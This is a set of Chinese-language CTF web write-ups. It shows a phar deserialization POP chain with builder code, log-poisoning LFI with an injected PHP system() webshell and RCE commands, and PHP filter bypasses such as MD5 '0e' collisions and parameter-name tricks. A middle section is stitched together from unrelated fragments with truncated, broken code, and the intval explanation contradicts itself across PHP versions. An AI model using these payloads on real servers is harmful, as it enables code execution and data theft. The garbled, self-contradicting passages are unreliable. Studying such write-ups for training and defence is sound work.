    [CISCN2019 华北赛区 Day1 Web1] Dropbox — 没有 unserialize 的反序列化

    题目类型：Web — phar 反序列化（POP 链）

    题目地址：CISCN 2019 华北赛区 Day1 Web1（原题环境已关闭）

    Flag：CTF2{0a2d4b76-7414-4da9-8d0a-2cfb19f333c0}

    题目概述

    一个网盘系统：注册登录后能上传文件、下载文件、删除文件。

    整站没有一处 unserialize() —— 但最终还是要靠反序列化拿 flag。

    解题过程

    Step 1：先把所有功能点一遍

    注册 → 登录 → 进去一看，有上传、下载、删除。

    先随便传一张图片试试 —— 传上去了，但是没有返回访问地址，访问不到。所以文件上传漏洞这条路走不通。

    Step 2：下载和删除能干什么

    这两个功能的共同点是：都接收一个文件名参数。

    下载：给文件名，返回内容      → 想到「任意文件下载」
删除：给文件名，把它删掉

    Step 3：用 Burp 把源码一个一个抓下来

    借着「任意文件下载」，把用到的每个 php 都抓下来。我先抓了 5 个：

    download.php
index.php
login.php
delete.php
class.php        ← 在看完 index.php 之后发现的：它被 include 了

    class.php 是这里面最重要的一个。

    Step 4：class.php 里找能拿 flag 的语句

    找到了这一处：

    public function close() {
    return file_get_contents($this->filename);
}

    file_get_contents 读的是 $this->filename —— 只要让这个属性等于 /flag.txt，close() 就能把 flag 读出来。

    但问题来了：整个站里没有 unserialize()，怎么让它执行？

    Step 5：没有 unserialize()，还有 phar

    这就是 phar 反序列化：

    有序列化数据必然会有反序列化操作。php 大部分的文件系统函数在通过 phar:// 协议解析 phar 文件时，都会对 meta-data 进行反序列化。

    换句话说：你不需要有 unserialize() 这个函数，只要有任何一个文件系统函数被传入了 phar:// 开头的路径，meta-data 里的对象就会被反序列化。

    可以触发的函数有一大张表：file_exists、file_get_contents、unlink、stat、readfile、copy……

    Step 6：download.php 不行，delete.php 行

    先看 download.php：

    if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    ...
    echo $file->close();
}

    它确实会调用 close()，但那个 stristr($filename, "flag") === false 把带 flag 的路径全过滤了 —— 走不通。

    再看 delete.php：

    public function detele() {
    unlink($this->filename);
}

    unlink() 正好在受影响函数列表里 —— 只要 filename 是 phar://...，调用 unlink 的那一刻就会触发反序列化。

    （注：方法名 detele 是原题作者拼错的，不是笔误。）

    Step 7：倒推整条链

    目标是 File::close()。但它没有什么特殊的触发方式，所以要一层层往上找。

    先看 FileList::__call：

    public function __call($func, $args) {
    array_push($this->funcs, $func);
    foreach ($this->files as $file) {
        $this->results[$file->name()][$func] = $file->$func();
    }
}

    $file->$func() 这一句是动态调用 —— 如果我们让 $func = 'close'，那 $file->close() 就被执行了。

    而 __call 的触发条件是：调用了一个不存在的方法。

    再往上看，User::__destruct：

    public function __destruct() {
    $this->db->close();
}

    $this->db 是我们可以控制的属性。只要让它等于一个 FileList 对象，那么 $this->db->close() 就变成了「对 FileList 调用一个它没有的方法 close」→ 正好触发上面的 __call。

    整条链就接起来了：

    unlink(phar://...)            ← delete.php 里的 File::detele()
  ↓ 触发 phar 的 metadata 反序列化
User::__destruct()
  ↓  $this->db->close()
FileList::__call('close')
  ↓  foreach $files: $file->close()
File::close()
  ↓  file_get_contents('/flag.txt')
结果存进 $results
  ↓
FileList::__destruct()        ← 把 results 输出出来

    这一步是我卡最久的地方：file_get_contents 读到了，但没有输出还是白搭。答案是 FileList 自己的 __destruct 会把 $results 打出来 —— 所以链的末端不是 close，而是「close 的结果被 __destruct 输出」。

    Step 8：构造 phar

    class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;
    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

$a = new User();
$a->db = new FileList();
$p = new Phar(__DIR__ . '/x.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'x');
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata($a);
$p->stopBuffering();

    一个坑：FileList 的三个属性都是 private，而且是数组。$results 和 $funcs 其实用不到，但也要通过构造函数一起初始化 —— 否则 __call 里 array_push 一个 null 会报错。

    Step 9：生成、上传、触发

    生成：

    php -d phar.readonly=0 pop.php

    ⚠️ 这里有两个坑：

    ① 指令名是 phar.readonly，不是 phar.onlyread
   —— 拼错 PHP 不会报错，只会静默忽略，然后报
   "creating archive disabled by the php.ini setting phar.readonly"

② 生成的 x.phar 可以随便改后缀（x.jpg / x.png 都行），
   phar 靠文件头识别，不靠扩展名

    上传 x.jpg，然后在删除时抓包，把 filename 改成：

    phar://x.jpg/test.txt

    放包 → flag 出来：

    CTF2{0a2d4b76-7414-4da9-8d0a-2cfb19f333c0}

    解题思路总结

    功能点一遍 → 上传没回显地址（上传洞死）
  → 下载/删除都收文件名 → 任意文件下载
    → 把 5 个 php 全抓下来
      → class.php 里有 file_get_contents（能读 flag）
        → 但整站没有 unserialize
          → 想到 phar：只要文件系统函数收到 phar:// 就会反序列化
            → download.php 过滤了 flag
              → delete.php 的 unlink 在受影响列表里 ✓
                → 倒推链：User::__destruct → FileList::__call → File::close
                  → 构造 phar → 改后缀上传 → 删除时改 filename → flag

    漏洞原理

    ① phar 的本质

    phar 是把整个项目打包成一个文件，可以直接 php xxx.phar 运行。它本质是一个包含多个文件的压缩包。

    ② 为什么它能触发反序列化

    phar 的 manifest 里有一段 metadata 区，PHP 在解析 phar 文件时会把它反序列化。

    而「解析 phar 文件」这件事，发生在任何接受路径的文件系统函数收到 phar:// 开头的字符串时 —— 包括 unlink、file_exists、stat、getimagesize 等等。

    所以不需要 unserialize() 这个函数，只要有「我能控制的路径」+「一个文件系统函数」，就能触发。**

    ③ 链的设计思路

    先找终点（能读写文件的语句）
  → 再找入口（能被外部触发的魔术方法）
    → 中间用「动态调用」「属性可控」把它们接起来
      → 最后别忘了：读到了 ≠ 输出了

    关键知识点

    知识点 说明
    phar:// 触发点 任何文件系统函数收到 phar:// 路径即解析 phar
    受影响函数 unlink / file_exists / file_get_contents / stat / readfile / copy / parse_ini_file …
    phar.readonly 默认 1，只能在 php.ini 或 -d 里改，且指令名不能拼错
    Phar 构造四件套 startBuffering() / addFromString() / setStub() / setMetadata() / stopBuffering()
    stub 要求 必须以 <?php 开头，包含 __HALT_COMPILER();
    后缀 任意后缀都能被 phar:// 打开
    __call 调用不存在的方法时触发，参数是方法名和参数数组
    __destruct 对象销毁时触发，常用于「链的入口」和「结果输出」
    私有属性构造 必须走构造函数初始化，否则魔术方法里操作 null 会报错

    Stage 2 · 文档管理系统 — 文件包含到日志注入

    题目类型：Web — PHP 文件包含 + 日志污染

    题目地址：ctfplus 平台实例（已关闭）

    Flag：ZeroGFlag{18e84305-6b07-4aca-84ee-9891c5cb062d}

    题目概述

    一个叫「碰星文件管理」的文档系统，登录页之后是一套像模像样的文件列表、检索、预览界面。

    先看页面有没有可以利用的，到处点了一遍 —— 实际有用的只有一个：文档预览。

    这个预览框能读任意「文档名」，而后端是 include()。

    解题过程

    Step 1：找到唯一有用的功能

    页面上按钮很多（新建、上传、回收站、已发布……），但除了预览，全是空壳。

    预览框输入文件名 → 前端发一个请求：

    fetch('index.php?file=' + encodeURIComponent(name), {method:'GET'})

    接口是 index.php?file=，参数名 file。

    Step 2：直接看 index.php 看不到 —— 用伪协议读源码

    ?file=index.php 返回空 —— 因为 include 把它执行了，而不是打印。

    换成 base64 编码滤镜：

    ?file=php://filter/convert.base64-encode/resource=index.php

    读到 2797 字节的源码。关键就在 include 和那条正则上。

    Step 3：cmd 是个陷阱

    $WAF_PATTERN = '/(flag|cat|ls|\*|\?)/i';

function run_maintenance_command($command)
{
    return system($command);
}

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (preg_match($WAF_PATTERN, $cmd)) { echo "安全策略…"; exit; }
    // 校验通过，命令参数将在文档内容渲染阶段被一并处理
}

    第一眼看像是「命令执行 + WAF」，但拉下去看完整文件会发现：run_maintenance_command() 只有定义，没有调用。

    注释自己也写着「Web 接口层不再直接触发」。

    WAF 保护的是一个什么都不做的空壳 —— 这个入口对我们没有任何实际作用。

    Step 4：真正的终点是 include，它过滤了目录穿越

    $file = str_replace('../', '', $file);   // 剥一次
$file = str_replace('..',  '', $file);   // 再剥一次

$is_stream = preg_match('#^[a-zA-Z0-9._+-]+://#', $file) === 1;

if ($is_stream)               { $target = $file; }
elseif (file_exists($file))   { $target = $file; }
elseif (file_exists('files/' . $file)) { $target = 'files/' . $file; }

if ($target === null) { echo "未找到指定的文档…"; exit; }

include($target);

    两点：

    ① ../ 被剥两次 → 相对穿越走不通（....// 这种双写也是死的）
② 但 file_exists($file) 对绝对路径直接为真 → 绝对路径完全可用

    而且 include 对文件类型的处理不一样：

    include 一个 txt  →  内容原样打印
include 一个 php  →  内容被当代码执行

    Step 5：确认日志路径

    先确认 Apache 还是 nginx 的日志能用：

    ?file=/var/log/apache2/access.log      → 读不到
?file=/var/log/nginx/access.log        → 能读

    但这里有个容易误判的地方 ——文件名写的是 nginx，日志内容却是 Apache 的：

    [Thu Oct 30 ...] [authz_core:error] [pid 23] [client ...]

    authz_core 是 Apache 模块，响应头也写着 Server: Apache/2.4.54 (Debian)。所以文件名只是路径巧合，服务端是 Apache。

    Step 6：access.log 突然 500，只能换 error.log

    一开始对 access.log 用得挺好，后来就一直是 500 —— 原因是别人先注入了一条写坏的 payload：

    script '/var/www/html/<?php eval($_GET['1'];?>.php' not found
                                      └─ 少一个 )，Parse error

    一行的语法错误，就能让整份日志作废（include 时直接 500）。

    所以换 error.log —— 它短、干净。

    Step 7：往 error.log 里注入

    关键：error.log 里那条 script '...' not found 是mod_php 找不到脚本时才写的 —— 只有路径以 .php 结尾才会产生。

    构造：

    GET /%3C%3Fphp%20system(%24_GET[2])%3B%3F%3E.php

    三个要点：

    要点 为什么
    URL 编码 < ? > 空格 不编码的话 ? 会被当成查询串起点，路径被截断
    结尾加 .php 不加就不进 error.log（只会进 access.log）
    payload 带 ?> 不带的话，日志后半截 ' not found... 会被当成 PHP 代码继续解析 → Parse error

    Step 8：先确认，再执行

    注入完不要直接 include，先用滤镜把日志读出来核对（不执行）：

    ?file=php://filter/convert.base64-encode/resource=/var/log/nginx/error.log

    能看到完整的一行：

    script '/var/www/html/<?php system($_GET[2]);?>.php' not found or unable to stat

    确认无误，再执行：

    ?file=/var/log/nginx/error.log&2=ls -la /

    Step 9：/.php 不是被截断，是被执行了

    第一次 include 日志时，看到的是这样：

    script '/var/www/html/.php' not found

    我一开始以为是 payload 被截断了，其实中间那一截是被 include 执行掉了：

    文本:  script '/var/www/html/
代码:  <?php system($_GET[2]);?>      ← 执行，不产生输出
文本:  .php' not found or unable to stat

    执行代码不会把代码本身打印出来 —— 所以那一段在响应里"凭空消失"。

    这也说明：用 include 看日志是「执行后的残骸」，只有 php://filter 才能做取证。

    Step 10：flag 不在 flag 文件里

    ls -la / 看到了：

    -r--------    1 root root   48 Oct 30 06:11 flag
-rwxr-xr-x    1 root root 1507 Oct 16 18:22 entrypoint.sh

    /flag 是 400 root，而当前进程是 uid=33(www-data) —— cat /flag 读不了，权限不够。

    那就读 entrypoint.sh（755，可读）：

    FLAG_VALUE="${ZeroG_2026_FLAG:-}"
export ZeroG_2026_FLAG="$FLAG_VALUE"
printf '%s\n' "$FLAG_VALUE" > "$FLAG_FILE"
chown root:root "$FLAG_FILE"
chmod 400 "$FLAG_FILE"
exec apache2-foreground

    原来如此：flag 来自环境变量 ZeroG_2026_FLAG，写进 /flag 之后还 export 给了 Apache。

    Apache 的子进程继承这个环境变量 → PHP 进程的 /proc/self/environ 里就有。

    ?file=/var/log/nginx/error.log&2=env

    在输出里直接就能看到：

    ZeroG_2026_FLAG=ZeroGFlag{18e84305-6b07-4aca-84ee-9891c5cb062d}

    解题思路总结

    页面到处点 → 只有「文档预览」是真功能
  → 前端 fetch('index.php?file='+name)   ← 泄漏了接口名
    → 直接读 index.php 是空的（被 include 执行了）
      → php://filter/convert.base64-encode 读源码
        → 发现 cmd 是陷阱（函数从未被调用）
          → 真入口是 include，绝对路径放行
            → 日志可读可写 → 注入 PHP 到 error.log
              → include 日志 → RCE
                → /flag 是 400 root 读不了
                  → entrypoint.sh 暴露了 flag 来自环境变量
                    → /proc/self/environ → flag

    漏洞原理

    ① WAF 保护的不一定是真入口

    cmd 参数有完整的 WAF，但它调用的函数从未被调用。真正的入口 file 一处过滤都没有。

    ② 绝对路径让「目录穿越过滤」形同虚设

    ../ 被剥两次，但 include 认绝对路径 —— 过滤只挡住了「相对」这一种写法。

    ③ 把「读文件」变成「执行文件」

    include + 日志 = 我们能把任意字节写进日志，再让它被当成代码执行。

    ④ flag 不一定在 flag 文件里

    /flag 是给 root 看的副本；entrypoint.sh 把它 export 给了 Apache，环境变量里才是我们能拿到的那一份。

    关键知识点

    知识点 说明
    php://filter/convert.base64-encode/resource=x 读源码不执行 —— 绕开 include 的执行
    include 的行为差异 txt 输出、php 执行
    str_replace('../','') 的双重剥除 ....// 这类双写也会被削平
    绝对路径 vs 相对路径 只过滤后者时，前者照样通
    日志注入三要素 路径可控 + 日志可读 + 日志会被 include
    路径必须以 .php 结尾 只有走 mod_php 才有 script not found 这条日志
    URL 编码 < ? > 否则 ? 截断路径
    payload 必须带 ?> 否则日志尾部被当代码解析 → Parse error

    Step 1：第一关，先看四道检查在拦什么

    首先进行代码审计：

0b 开头  →  2 进制      ✗ 字母 b 被拦了
0 开头   →  8 进制      ✓ 纯数字，只剩这条
其他     →  10 进制     ✗ 十进制真值会等于 411413，被第一道 `==` 拦

    用 convert.base64-decode，数据在落盘前会先做一次 base64 解码。而 base64 解码器的规则是：

    ① 只认 [A-Za-z0-9+/=]
② 其他字符（< ? 空格 ; >）直接丢掉
③ 剩下的每 4 个字符 → 3 字节

7 + 1 + 32 = 40  ✅
7 + 5 + 32 = 44  ✅   加 5 个凑成 12 也行

    不足 4 的倍数，滤镜会报 invalid byte sequence，写入直接失败。

    A  __destruct  →  echo "…" . $this->sign          （把对象当字符串拼接）

    解题过程

    Step 1：先找能执行代码的地方

    审计代码，先找能执行代码的地方，然后倒着推。

    全文只有一个真正的执行点：

    class F {
    private $flag_trigger;
    public function __set($name, $value) {
        if ($name !== 'flag_trigger') return;
        echo "RCE:<br>";
        system($value);          // ← 终点

}

    所以要满足两个条件：$name === 'flag_trigger'，且 $value 是我能控制的字符串。

    Step 2：倒推 —— 谁能写 F 的私有属性

    public $sink;
    public $cmd;

        if (!($this->sink instanceof F)) return;
        $this->sink->flag_trigger = $this->cmd;   // ← 写私有属性

}

    E::__get 里写了 $this->sink->flag_trigger —— 只要 sink 是 F 的实例，就会走到 __set，$value 就是 $this->cmd。

    所以 cmd 就是我的命令，从这里传进去。

    Step 3：倒推 —— 谁读 E 的不存在属性

    __get 是在访问不可访问属性时触发的。看 D：

    public $property;

    只要 property 写成 E 里不存在的名字（比如 flag），$this->next->$p 就会触发 E::__get。

    Step 4：倒推 —— 谁调 D 的不存在方法

        $m = $this->method;

    而 eval 在黑名单里，所以要用拼接：

    $a='ev'.'al'; $a($_POST[1]);

    关键点：这道题的黑名单只扫上传文件的内容，不扫 HTTP 请求体 —— 所以蚁剑发过来的 body 里带什么词都不受影响。

    为什么一个字符能过 1337

    ፼ 不是一个「奇怪的符号」，它是 Unicode 里的一个数字：

    项 值
    码点 U+137C
    官方名字 ETHIOPIC NUMBER TEN THOUSAND（埃塞俄比亚数字「一万」）
    字符长度 1
    代表的数值 10000

    关键点：后端比的是数值，不是字符长度。它应该是用 Python 的 unicodedata.numeric() 把字符转成数字再比较：

    >>> import unicodedata
>>> unicodedata.numeric('፼')
10000.0

    所以「只能一个字符」这条限制，和「不能超过 1337」这条限制，是两个维度的事 —— 一个字符完全可以代表一个很大的数。

 * Flag：由平台以环境变量 FLAG 动态注入，选手 RCE 后 env/printenv FLAG 读取。

    顺带一个坑：cat /index.php 为什么不行

    我一开始想 cat /index.php，结果什么都没出来；换成 cat index.php 就有了。

    因为这两个是完全不同的东西：

    /index.php   ← 文件系统根目录下的 index.php   → 不存在
index.php    ← 当前工作目录下的 index.php      → 存在

    而且 cat /index.php 报的 No such file or directory 走的是 stderr，system() 只回显 stdout，所以页面看起来就是「什么都没发生」。

    ZeroG_2026（Stage 2）

    三层，一层比一层贴源码。

    第一层：正则 + 严格不等

    if (isset($_GET['zero'])
    && preg_match('/^ZeroG 2026!$/', $_GET['zero'])
    && $_GET['zero'] !== 'ZeroG 2026!') {

    审计代码第一层：正则里的 ^ 意味着从第一个字符就要匹配，$ 意味着到这里就要终止，所以原字符串要是 ZeroG 2026!，但是后面又要 !==（严格不等）。

    这里补充 PCRE 的 $：它除了匹配字符串末尾，还可以匹配"末尾换行之前"，所以在末尾加上 \n 也可以，这样就绕过了第一层。

    ?zero=ZeroG%202026!%0A

    第二层：intval 和算术运算用两套规则

    if (intval($_GET['xp']) < 2026 && intval($_GET['xp'] + 4) > 2030) {

    这里用到了 intval，就系统去补充了一下相关知识：

    行为 例子
    截断小数点 intval(0.9) = 0
    只取前导数字 intval("123abc") = 123
    反过来不行 intval("abc123") = 0（不是 123）
    带进制参数 intval($a, $b) $b = 0 时看前缀：0 开头按 8 进制、0x 开头按 16 进制，否则按 10 进制

    接着看到这里：既要小于 2026，又要加 4 之后大于 2030。

    最开始想的是用字符串改小进制，但这里不行。所以想到用 2025e9：

    intval('2025e9')  = 2025            ← 遇到 e 就直接停了
'2025e9' + 4      = 2.025e12        ← 2025×10⁹，算术运算先算完，才交给 intval

    同一个字符串，被两套规则解释：intval() 只认前导整数，算术运算认科学计数法。

    ?zero=ZeroG%202026!%0A&xp=2025e9

    第三层：弱等于模拟强等于 + 一个 [ 的妙用

    if (isset($_POST['Welcome__ctf.2026']) && isset($_POST['mm'])) {
    $a = $_POST['Welcome__ctf.2026'];
    $b = $_POST['mm'];
    if ($a !== $b && md5($a) == md5($b)) {

    用 ==（弱等于）去模拟 !==（强不等）： 找一组 MD5 值都以 0e 开头的数据：

    QNKCDZO   → md5 = 0e830400451993494058024219903391
240610708 → md5 = 0e462097431906509019562562988736854

    两个 0e... 在 == 下都被当成 0 × 10ⁿ = 0，所以相等；但原字符串不同，!== 也成立。

    接着构造：

    Welcome__ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    当然没有这么简单 —— 因为 PHP 会把参数名里的 . 转换成 _，所以这个名字根本出不来。

    我也卡在这里很久。

    最后发现的东西

    PHP 7.4 的源码逻辑：循环转换 . 和空格，但是遇到 [ 会直接把它替换成 \0（字符串截断符），然后跳出循环：

    跳出循环之后，PHP 认为这是数组语法，会去寻找与之配对的 ] —— 但是找不到！

    找不到之后，又会把刚刚的 \0 换回 _，恢复完整字符串：

    所以只要把其中一个 _ 改成 [，就能让结果刚好等于原来的名字：

    Welcome__ctf.2026   →  循环走完全程 → 点被转 → Welcome__ctf_2026   ✗
Welcome_[ctf.2026   →  在 [ 处 break → 点没被处理 → 恢复 [ 为 _ → Welcome__ctf.2026   ✓

    一个字符同时做了两件事：截断循环（让点逃过转换）+ 恢复之后补回那个下划线。

    最终 payload：

    Welcome_[ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    拿到 flag。

    cat /flag* 和 cat flag* 的区别

    这里试了一下：cat flag* 抓不到，cat /flag* 才能抓到。

    原因是当前工作目录。web 进程的 cwd 是网站目录（/var/www/html 之类），而 flag 文件在根目录 /：

    cat flag*     ← 相对路径，在网站目录里找 → 找不到
cat /flag*    ← 绝对路径，从根目录找     → 命中

    同一类问题在上一道题里是反过来的：那次 cat /index.php 失败、cat index.php 成功，因为文件就在 cwd 里。

    所以路径没有好坏，只有对不对得上文件所在的位置。

    一个版本细节

    intval('2025e9') 只在 PHP 5 上返回 2025。

    PHP 5:   intval('2025e9') = 2025            ← 遇到 e 就停
PHP 7.1: intval('2025e9') = 2025000000000   ← 也认科学计数法了

    我在本地 PHP 7.4 上实测确认过：intval('2025e9') 返回 2025000000000，第一个条件就直接不成立。

    所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。
